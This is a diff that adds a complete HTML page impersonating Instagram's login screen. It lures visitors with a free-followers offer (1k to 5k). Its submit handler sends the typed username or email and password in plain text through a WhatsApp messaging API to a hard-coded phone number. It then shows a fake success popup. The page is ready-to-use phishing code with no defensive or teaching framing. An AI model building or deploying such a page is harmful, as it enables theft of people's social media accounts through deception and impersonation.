@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* Container for the page */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100vh;
+        }
+
+        /* Left column (login form) */
+        .left-column {
+            background-color: #fff;
+            padding: 40px 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Logo */
+        .logo-container img {
+            width: 160px; /* Increased logo size */
+            margin-bottom: 20px;
+        }
+
+        /* Followers options */
+        .followers-option {
+            width: 100%;
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+            font-size: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .followers-option span {
+            font-weight: bold;
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 15px; /* Added some space between the text and the options */
+        }
+
+        .followers-option .options-container {
+            display: flex; /* Arrange options horizontally */
+            justify-content: center; /* Align options to the center */
+            width: 100%;
+        }
+
+        .followers-option div {
+            display: block;
+        }
+
+        .followers-option input[type="radio"] {
+            display: none;
+        }
+
+        .followers-option input[type="radio"] + label {
+            display: inline-block;
+            padding: 8px 14px;
+            background-color: #fff;
+            border-radius: 8px;
+            border: 2px solid #ddd;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: #555;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .followers-option input[type="radio"]:checked + label {
+            background-color: #3897f0;
+            color: white;
+            border-color: #3897f0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .followers-option label:hover {
+            background-color: #f2f2f2;
+            border-color: #bbb;
+        }
+
+        /* Login fields */
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .login-form input:focus {
+            border-color: #3897f0;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #2a80cc;
+        }
+
+        /* Links */
+        .forgot-password a,
+        .signup a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+        }
+
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        /* Mobile responsive */
+        @media (max-width: 768px) {
+            .login-container {
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .left-column {
+                width: 90%;
+                margin-bottom: 20px;
+            }
+
+            /* Adjust the size of the logo on smaller screens */
+            .logo-container img {
+                width: 140px; /* Adjusted logo size on mobile */
+            }
+        }
+
+        /* Modal (popup) styling */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Dark background */
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 500px;
+            width: 80%;
+        }
+
+        .modal-header {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .modal-footer {
+            margin-top: 20px;
+        }
+
+        .close {
+            color: #aaa;
+            font-size: 30px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="left-column">
+            <div class="logo-container">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzld_xZ8ywiIt9BR9kjE6FZfdaLVc6fHQNbQ&s" alt="Instagram Logo">
+            </div>
+
+            <!-- Followers options -->
+            <div class="followers-option">
+                <span>Choose number of followers</span>
+                <div class="options-container">
+                    <div>
+                        <input type="radio" id="1k" name="followers" value="1k" checked>
+                        <label for="1k">1k</label>
+                    </div>
+                    <div>
+                        <input type="radio" id="2k" name="followers" value="2k">
+                        <label for="2k">2k</label>
+                    </div>
+                    <div>
+                        <input type="radio" id="3k" name="followers" value="3k">
+                        <label for="3k">3k</label>
+                    </div>
+                    <div>
+                        <input type="radio" id="4k" name="followers" value="4k">
+                        <label for="4k">4k</label>
+                    </div>
+                    <div>
+                        <input type="radio" id="5k" name="followers" value="5k">
+                        <label for="5k">5k</label>
+                    </div>
+                </div>
+            </div>
+
+            <form class="login-form" id="loginForm">
+                <input type="text" id="email" placeholder="Email or Username" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="signup">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal (popup) -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                Thank you!
+            </div>
+            <p>Your request has been completed successfully!</p>
+            <div class="modal-footer">
+                <span class="close">&times;</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+
+            // Collect values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Collect all selected followers options
+            const selectedOptions = [];
+            const options = document.querySelectorAll('input[name="followers"]:checked');
+            options.forEach(option => selectedOptions.push(option.value));
+
+            // Join the selected options into a single string
+            const followersMessage = selectedOptions.join(", ");
+
+            // Construct the URL with the API parameters
+            const apiUrl = `https://api.callmebot.com/whatsapp.php?phone=967735308665&text=Email%20or%20Username:%20${email}%0APassword:%20${password}%0AChosen%20followers%20count:%20${followersMessage}&apikey=7096498`;
+
+            // Send the request to the API
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent successfully:', data);
+                    
+                    // Show the success modal
+                    document.getElementById('successModal').style.display = 'flex';
+                })
+                .catch(error => {
+                    console.error('Error sending message:', error);
+                    alert('Failed to send message.');
+                });
+        });
+
+        // Close modal
+        const closeModal = document.querySelector('.close');
+        closeModal.addEventListener('click', function() {
+            document.getElementById('successModal').style.display = 'none';
+        });
+
+        // Close modal if clicked outside
+        window.onclick = function(event) {
+            if (event.target === document.getElementById('successModal')) {
+                document.getElementById('successModal').style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
